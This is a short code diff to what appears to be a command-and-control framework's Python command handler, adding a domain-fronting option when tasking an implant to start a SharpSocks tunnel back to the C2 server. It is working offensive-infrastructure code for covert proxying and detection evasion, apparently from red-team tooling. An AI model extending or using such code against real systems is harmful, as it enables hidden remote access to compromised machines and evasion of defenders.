@@ -650,6 +650,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         sharpurls = get_sharpurls()
         sharpurl = select_item("HostnameIP", "C2Server")
         sharpport = select_item("ServerPort", "C2Server")
+        dfheader = select_item("DomainFrontHeader", "C2Server")
         implant = get_implantdetails(randomuri)
         pivot = implant[15]
         if pivot != "PS":
@@ -665,11 +666,12 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
         if ri.lower() == "n":
             print("")
-        if ri == "":
-            new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
-        if ri.lower() == "y":
-            new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
-        update_label("SharpSocks", randomuri)
+        if (ri == "") or (ri.lower() == "y"):
+            taskcmd = "Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls)
+            if dfheader:
+                taskcmd += " -DomainFrontURL %s" % dfheader
+            new_task(taskcmd, user, randomuri)
+            update_label("SharpSocks", randomuri)
 
     elif command == "history":
         startup(user, get_history())
